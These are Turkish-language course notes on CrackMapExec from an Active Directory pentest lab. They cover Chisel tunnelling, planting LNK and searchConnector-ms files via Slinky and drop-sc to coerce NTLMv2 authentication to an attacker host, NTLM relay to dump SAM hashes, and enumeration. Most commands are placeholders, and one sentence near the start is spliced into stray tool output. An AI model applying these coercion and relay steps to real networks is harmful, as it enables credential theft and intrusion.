+### Paylaşımları Geri Alma
+
+![Pasted image 20241203155153.png](/img/user/resimler/Pasted%20image%2020241203155153.png)
+
+
+### Kullanıcı Ekleme ve Kaldırma
+CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve creds add veya creds remove kullanıyoruz.
+
+
+### cmedb'ye Kullanıcı Ekleme
+
+![Pasted image 20241203155239.png](/img/user/resimler/Pasted%20image%2020241203155239.png)
+Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.
+
+
+### Bir Kullanıcıyı cmedb'den Kaldırma
+
+![Pasted image 20241203155300.png](/img/user/resimler/Pasted%20image%2020241203155300.png)
+
+![Pasted image 20241203155318.png](/img/user/resimler/Pasted%20image%2020241203155318.png)
+
+
+### Empire Kimlik Bilgilerini İçe Aktarma
+cmedb'nin sahip olduğu bir başka özellik de Empire'dan kimlik bilgilerini içe aktarma yeteneğidir.
+
+
+### Import from Empire
+
+![Pasted image 20241203155352.png](/img/user/resimler/Pasted%20image%2020241203155352.png)
+
+Not: Bu özelliği kullanmak istiyorsanız Empire'ı yapılandırdığınızdan emin olun
+
+### Export cmedb Data
+
+CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları dışarı aktarabiliriz
+
+
+### Kimlik Bilgilerini cmedb'den Dışa Aktarma
+
+![Pasted image 20241203155453.png](/img/user/resimler/Pasted%20image%2020241203155453.png)
+
+![Pasted image 20241203155458.png](/img/user/resimler/Pasted%20image%2020241203155458.png)
+
+Veriler CSV dosyası olarak dışa aktarılır. LibreOffice veya Excel gibi araçları kullanarak açabiliriz.
+
+![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)
+
+
+
+### skill 
+
+CrackMapExec aracı hakkında derinlemesine bir eğitim kursu aldıktan sonra ilk Dahili Sızma Testinizi gerçekleştiren bir Sızma Test Uzmanısınız. Müşteriniz INLANEFREIGHT CORP, Active Directory ortamını değerlendirmek için firmanızı işe aldı. İlk göreviniz geçerli bir hesap bulmak ve farklı protokoller kullanarak ortak bir parola denemek. Müşteriniz herhangi bir kesinti süresini göze alamaz, bu nedenle herhangi bir hesabı kilitlememeye dikkat etmeniz gerekir. Geçerli bir hesap bulduğunuzda, diğer hesapları ele geçirmenize yardımcı olacak ilginç bilgileri bulmak için numaralandırın, numaralandırın, numaralandırın. Unutmayın, amacınız alan yöneticisi erişimi elde edene kadar mümkün olduğunca çok hesabı ele geçirmektir. Amacınız hedef etki alanını ele geçirmek ve NTDS dosyasının içeriğini elde etmektir. Bu modülü dikkatle takip ettiyseniz, uzun sürmeyecektir.
+
+
+### Hedef ortama bağlanma adımları
+
+Uzaktan dahili bir sızma testi yapıyorsunuz, bu nedenle önce VPN'e bağlanmanız ve oradan 172.16.15.0/24 hedef ağına dahili numaralandırma yapmanız gerekecek. Dahili şirket ağına bağlanmak için aşağıdaki gibi Chisel ve proxyychains kullanmanız gerekecektir:
+
+
+### Connecting to the Internal Network VPN
+
+![Pasted image 20241203155738.png](/img/user/resimler/Pasted%20image%2020241203155738.png)
+![Pasted image 20241203155743.png](/img/user/resimler/Pasted%20image%2020241203155743.png)
+
+Chisel ile kullanmayı seçtiğiniz bağlantı noktasıyla eşleşmesi için /etc/proxychains.conf dosyasını değiştirmeyi unutmayın.
+
+Hedef sistemi başlattığınızda, 10.129.204.182 örnek IP'sini hedef IP'nizle değiştirin.
+
+Dahili ağı numaralandırmak için şu komutu kullanabilirsiniz: 
+proxychains crackmapexec [protocol] [target] CME ile Proxychains bölümünde gösterildiği gibi., 'netlogon', 'sysvol']
+SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
+['ico', 'lnk']
+SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
+SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
+/tmp/cme_spider_plus
+```
+
+Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:
+
+
+### Kullanıcının Kullanabileceği Dosyaları Listeleme
+
+{{CODE_BLOCK_94}}
+
+Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:
+
+{{CODE_BLOCK_95}}
+
+{{CODE_BLOCK_96}}
+
+Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir
+
+`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:
+
+
+### Spider_plus Options
+
+{{CODE_BLOCK_97}}
+
+Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.
+
+
+---
+
+
+### Proxychains with CME
+
+### Scenario
+
+İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:
+
+![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)
+
+DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.
+
+
+### Set Up the Tunnel
+
+Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:
+
+*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:
+
+### Chisel - Reverse Tunnel
+
+{{CODE_BLOCK_98}}
+
+
+*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:
+
+
+### Upload Chisel
+
+{{CODE_BLOCK_99}}
+
+
+* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)
+
+
+### Connect to the Chisel Server
+
+{{CODE_BLOCK_100}}
+
+Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.
+
+**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.
+
+### Chisel Receiving Session No. 1
+
+{{CODE_BLOCK_101}}
+
+TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:
+
+
+### Check Listening Port
+
+{{CODE_BLOCK_102}}
+
+* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:
+
+
+### Configure Proxychains
+
+{{CODE_BLOCK_103}}
+
+* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:
+
+### CrackMapExec'in Proxychains ile Test Edilmesi
+
+{{CODE_BLOCK_104}}
+
+
+Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:
+
+### Quiet Seçeneği ile Proxychains4
+
+{{CODE_BLOCK_105}}
+
+Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.
+
+
+### Killing Chisel on the Target Machine
+
+İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.
+
+
+### Kill the Chisel Client
+
+{{CODE_BLOCK_106}}
+
+Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:
+
+
+### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması
+
+{{CODE_BLOCK_107}}
+
+Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.
+
+
+### Attack Host Üzerinde Chisel'i Kapatma
+
+{{CODE_BLOCK_108}}
+
+
+### Sunucu olarak Windows ve Client olarak Linux
+
+Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.
+
+
+### Chisel'i Hedef Makinede Sunucu Olarak Başlatma
+
+{{CODE_BLOCK_109}}
+
+Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.
+
+
+### Attack Hostumuzdan Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_110}}
+
+Şimdi Proxychains'i tekrar kullanabiliriz:
+
+### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma
+
+{{CODE_BLOCK_111}}
+
+Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.
+
+İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.
+
+---
+
+### Stealing Hashes
+
+Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.
+
+Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.
+
+Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.
+
+NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.
+
+
+### Slinky Modülü
+
+`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.
+
+Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.
+
+
+### Slinky Module Options
+
+{{CODE_BLOCK_112}}
+
+`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.
+
+
+### Chisel kullanarak bağlama
+
+Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**
+
+
+### Hedef Makine Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_113}}
+
+
+### NTLMv2 Hash'lerinin Çalınması
+İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:
+
+### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma
+
+{{CODE_BLOCK_114}}
+
+
+Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 
+
+**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.
+
+
+### Using Slinky
+
+{{CODE_BLOCK_115}}
+
+
+![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)
+
+**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.
+
+Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.
+
+LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 
+
+
+### Starting Responder
+
+{{CODE_BLOCK_116}}
+
+Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.
+
+NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
+
+
+### **NTLM Relay**
+
+Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
+
+Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
+
+### Getting Relay List
+
+{{CODE_BLOCK_117}}
+
+
+**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
+
+Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
+
+### Execute NTLMRelayX
+
+{{CODE_BLOCK_118}}
+
+Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
+
+Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
+
+{{CODE_BLOCK_119}}
+
+Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
+
+### Local Hesapları Test Etme
+
+{{CODE_BLOCK_120}}
+
+### Her Şeyi Temizleyin
+
+Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
+
+### Cleanup
+
+{{CODE_BLOCK_121}}
+
+### drop-sc Modülü ile Hash'lerin Çalınması
+Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
+
+Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+
+CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+
+İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
+
+* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+
+* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+
+* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+
+Drop-sc'yi iş başında görelim:
+
+
+### Dropping a searchConnector-ms File
+
+![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+
+![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+
+Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+
+
+### NTLMRelayx ve drop-sc Kullanarak Aktarma
+
+![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
+![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
+
+Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+
+
+### searchConnector-ms Dosyalarını Temizleme
+![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
+![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
+
+LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+
+### SMB ile Eşleme ve Numaralandırma
+
+CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
+
+![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
+![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+
+Daha önce çalışmamış olanları gözden geçirelim:
+
+### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+
+Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+
+
+### Sessions ve loggendon-users seçeneklerini kullanma
+![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
+
+Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+
+
+### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
+![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
+![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+
+### Enumerate Computers
+
+CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
+
+
+### Domain'deki Bilgisayarları Numaralandırma
+![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
+
+
+### Enumerate LAPS
+
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+
+![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
+
+![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+
+![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
+
+Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
+
+
+### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
+
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+
+
+### List Local Users
+
+![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
+![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
+![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
+![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
+![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+
+Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+
+rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
+
+
+### Enumerate Disks
+
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+
+### Enumerating Disks
+![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+
+### Local ve Domain Gruplarını Numaralandırma
+Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+### Enumerating Local Groups
+![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
+![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
+
+
+### Enumerating Domain Groups
+![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
+![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
+
+Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+
+
+### Group **Members**
+![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
+
+Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+
+
+### Querying WMI
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+
+Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+
+WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+
+
+### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
+![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
+
+WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+
+
+### Quering root\WMI Namespace
+![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
+![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
+
+Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+
+Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
+
+
+### LDAP and RDP Enumeration
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
+
+
+### LDAP & RDP Commands
+LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
+![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
+![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
+
+Henüz çalışmadıklarımızı gözden geçirelim.
+
+
+### Enumerating Users and Groups
+
+SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+
+### Enumerating Users and Groups
+
+![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
+![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
+![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
+![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+
